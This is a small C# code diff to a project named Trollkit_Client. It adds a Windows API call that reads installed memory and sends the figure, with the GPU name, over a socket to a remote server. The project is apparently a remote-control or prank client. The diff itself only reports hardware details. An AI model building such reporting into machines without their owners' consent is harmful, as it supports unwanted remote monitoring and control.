@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using Trollkit_Library;
@@ -14,6 +15,11 @@ namespace Trollkit_Client.Modules.CommandHandlers
 {
 	class SystemInfoHandler : ICommandHandler
 	{
+		[DllImport("kernel32.dll")]
+		[return: MarshalAs(UnmanagedType.Bool)]
+		static extern bool GetPhysicallyInstalledSystemMemory(out ulong TotalMemoryInKilobytes);
+
+
 		public override bool HandleCommand(Socket s, TransferCommandObject obj)
 		{
 			switch (obj.Command)
@@ -54,6 +60,17 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			TransferCommandObject gpuNameTransferObject = new TransferCommandObject { Command = "GPU", Value = gpuName };
 			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(gpuNameTransferObject));
 
+			string ramString = GetRamAmount();
+			TransferCommandObject ramTransferObject = new TransferCommandObject { Command = "RAM", Value = ramString };
+			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(ramTransferObject));
+
+		}
+		
+		private string GetRamAmount()
+		{
+			ulong l;
+			GetPhysicallyInstalledSystemMemory(out l);
+			return (l / 1024) + "Mb RAM";
 		}
 
 		private string GetGPUName()
